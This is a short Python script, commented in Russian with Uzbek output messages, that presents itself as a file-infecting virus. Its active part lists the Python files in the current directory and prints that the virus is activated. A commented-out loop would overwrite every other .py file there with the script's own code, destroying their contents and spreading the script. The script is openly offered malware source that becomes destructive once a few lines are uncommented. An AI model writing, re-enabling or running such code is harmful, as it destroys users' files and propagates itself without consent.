import os
import shutil

# Функция, которая копирует сам себя в другие файлы в той же директории
def infect():
    # Получаем список всех файлов в текущей директории
    files = os.listdir()
    print(files)
    # Отфильтровываем только исполняемые файлы на Python (с расширением .py)
    python_files = [file for file in files if file.endswith('.py')]

    # Цикл для копирования вируса в другие файлы
    # for file in python_files:
    #     # Исключаем текущий исполняемый файл
    #     if file != os.path.basename(__file__):
    #         try:
    #             shutil.copy(__file__, file)
    #             print(f"Fayl {file} zararlandi!")
    #         except Exception as e:
    #             print(f"Fayl yuklanmadi {file}: {str(e)}")

# Запуск вируса
if __name__ == "__main__":
    infect()
    print("Virus faollashtirildi!")

